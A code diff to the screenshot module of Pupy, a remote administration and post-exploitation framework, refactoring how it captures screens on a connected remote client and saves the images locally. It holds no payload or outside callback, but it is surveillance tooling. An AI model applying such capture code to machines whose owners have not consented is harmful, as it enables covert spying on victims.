@@ -44,22 +44,28 @@ __class_name__="Screenshoter"
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
-    dependencies = ['mss', 'screenshot']
+    dependencies = [
+        'mss', 'screenshot', 'png'
+    ]
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
-        self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
-        self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
-        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='screenshot', description=cls.__doc__)
+        cls.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
+        cls.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
+        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
-        rscreenshot = self.client.conn.modules['screenshot']
+        screens = self.client.remote('screenshot', 'screens')
+        screenshot = self.client.remote('screenshot', 'screenshot')
+
         if self.client.is_android()==True:
             self.error("Android target, not implemented yet...")
+
         else:
             if args.enum:
                 self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
-                for i, screen in enumerate(rscreenshot.screens()):
+                for i, screen in enumerate(screens()):
                     if not (screen['width'] and screen['height']):
                         continue
 
@@ -70,16 +76,16 @@ class Screenshoter(PupyModule):
                 return
 
             config = self.client.pupsrv.config or PupyConfig()
-            folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+            filepath_base = config.get_file('screenshots', {'%c': self.client.short_name()})
 
-            screenshots, error = rscreenshot.screenshot(args.screen)
+            screenshots, error = screenshot(args.screen)
             if not screenshots:
                 self.error(error)
             else:
                 self.success('number of monitor detected: %s' % str(len(screenshots)))
 
                 for i, screenshot in enumerate(screenshots):
-                    filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                    filepath = filepath_base + '-{}.png'.format(i)
                     with open(filepath, 'w') as out:
                         out.write(screenshot)
                         self.success(filepath)
